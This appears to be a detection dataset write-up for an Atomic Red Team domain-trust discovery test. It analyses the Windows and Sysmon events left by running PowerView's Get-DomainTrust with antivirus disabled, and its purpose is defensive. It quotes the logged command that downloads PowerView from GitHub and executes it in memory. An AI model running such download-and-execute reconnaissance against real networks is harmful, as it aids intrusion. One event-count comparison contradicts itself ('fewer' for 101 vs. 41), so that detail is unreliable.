# T1482-6: Domain Trust Discovery — Get-DomainTrust with PowerView

## Technique Context

T1482 (Domain Trust Discovery) via PowerView represents the post-exploitation operator's preferred approach to AD enumeration. PowerView (from the PowerSploit framework) provides rich Active Directory querying capabilities through PowerShell without requiring RSAT tools or admin privileges. `Get-DomainTrust` enumerates trust relationships for the current domain by querying domain controllers via LDAP.

Test T1482-6 uses the in-memory download pattern to avoid writing PowerView to disk: it invokes `IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose`. In the defended variant, Windows Defender detected the PowerView content and terminated the process with exit code `0xC0000022` before `Get-DomainTrust` could complete. In this undefended dataset, the technique runs without antivirus intervention.

## What This Dataset Contains

This dataset captures the execution of `Get-DomainTrust` via in-memory PowerView download on ACME-WS06 with Defender disabled.

**Security EID 4688** provides the primary evidence. PowerShell (running as `NT AUTHORITY\SYSTEM`) spawns a child `powershell.exe` process with the full command line:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose}
```

This single Security EID 4688 event captures the complete attack intent: the TLS 1.2 enforcement to reach GitHub, the exact commit-pinned PowerSploit URL, and the specific function `Get-DomainTrust -Verbose`. The PowerShell process exits with `0x0` (success) in the undefended run — unlike the defended variant where the exit code was `0xC0000022` indicating Defender termination.

**Sysmon EID 1** captures the child `powershell.exe` invocation with hashes. A second `whoami.exe` Sysmon EID 1 event documents the test framework pre-execution context check.

**Sysmon EID 8** (CreateRemoteThread) is present. In the defended variant, this event was attributed to Defender or AMSI instrumentation hooks firing inside the PowerShell process during signature scanning. In the undefended run, its presence suggests this is instead a normal artifact of PowerShell's AMSI initialization hooks or .NET thread creation during PowerView module loading — not Defender activity.

**Sysmon EID 3** is absent from this dataset (not in the bundled channels), so the outbound HTTPS connection to `raw.githubusercontent.com` to download PowerView.ps1 is not directly observed here, though the `0x0` exit code confirms the download and execution completed successfully.

**Sysmon EID 7** (ImageLoad): 17 image load events document the full .NET and PowerShell assembly stack that loaded during the execution, more than in the defended variant (17 vs. ~9 in the defended run). The higher count in the undefended run reflects PowerView loading additional .NET assemblies during its LDAP enumeration work rather than being killed during startup.

**Sysmon EID 11** (FileCreate) captures the PowerShell profile write to `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive`, indicating a non-interactive PowerShell session was used.

The PowerShell channel (101 events: 97 EID 4104 + 2 EID 4103 + 2 EID 4100) contains ART test framework boilerplate and error-handling script blocks. EID 4100 events indicate PowerShell errors during execution, which may reflect the domain query returning no results (the `acme.local` test environment has a single domain with no external trusts) rather than an execution failure.

**Compared to the defended variant** (25 Sysmon / 9 Security / 41 PowerShell): The undefended dataset has more Sysmon events (27 vs. 25) reflecting deeper PowerView execution, fewer Security events (4 vs. 9) because there are no Defender-related exit code events, and fewer PowerShell events (101 vs. 41) — the larger count here likely reflects PowerView's own script block logging during its AD enumeration. The successful `0x0` exit code is the key difference: PowerView ran to completion.

## What This Dataset Does Not Contain

Sysmon EID 3 (NetworkConnect) for the `raw.githubusercontent.com` download is not included in the bundled channels. If the Sysmon network connection channel were included, you would expect to see a connection from `powershell.exe` to port 443 at GitHub's IP space. The actual `Get-DomainTrust` output is not captured in any log — LDAP enumeration results appear in PowerShell standard output, not in event logs. There are no domain controller logs in this dataset; if the LDAP query reached the DC, it would generate events there. The PowerShell EID 4104 script block logs do not include the PowerView function body, possibly because the function completed before AMSI-triggered script block logging captured it.

## Assessment

This dataset provides clean, undefended execution telemetry for the PowerView `Get-DomainTrust` in-memory download pattern. The defining evidence — the full command line with the PowerSploit GitHub URL and function name in Security EID 4688 — is present and unambiguous. The successful `0x0` exit code confirms PowerView ran and `Get-DomainTrust` executed without interference. The higher Sysmon EID 7 count (17 image loads vs. ~9 in the defended run) reflects the additional .NET assembly loading that occurs when PowerView actually runs its AD enumeration, providing a secondary behavioral differentiator between an attempted and a completed execution.

Pairing this dataset with T1482-6 from the defended collection gives you clean before/after comparison: identical command line evidence, but different exit codes and different Sysmon image-load counts.

## Detection Opportunities Present in This Data

- **Security EID 4688**: PowerShell command line containing `IEX`, `IWR`, and the PowerSploit GitHub URL is a compound direct IOC. Any one of `PowerSploit`, `Get-DomainTrust`, or the raw GitHub URL for PowerView individually warrants investigation.
- **Security EID 4688**: The TLS enforcement pattern `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` combined with an outbound `IWR` to GitHub immediately before an AD enumeration function is a behavioral cluster that appears across many PowerShell-based attack toolkits.
- **Sysmon EID 1**: Child `powershell.exe` spawned by a parent `powershell.exe` (the ART test framework spawning a technique-specific PowerShell) with an `IEX`/`IWR` GitHub pattern in the command line.
- **Sysmon EID 8**: CreateRemoteThread events in a `powershell.exe` process that loaded PowerView are worth correlating — they may indicate AMSI instrumentation, which is itself a signal that something unusual loaded into the PowerShell process.
- **Successful exit code (`0x0`) on a process that contained `Get-DomainTrust`** distinguishes actual enumeration completion from Defender-blocked attempts (`0xC0000022`), which is useful for coverage measurement.
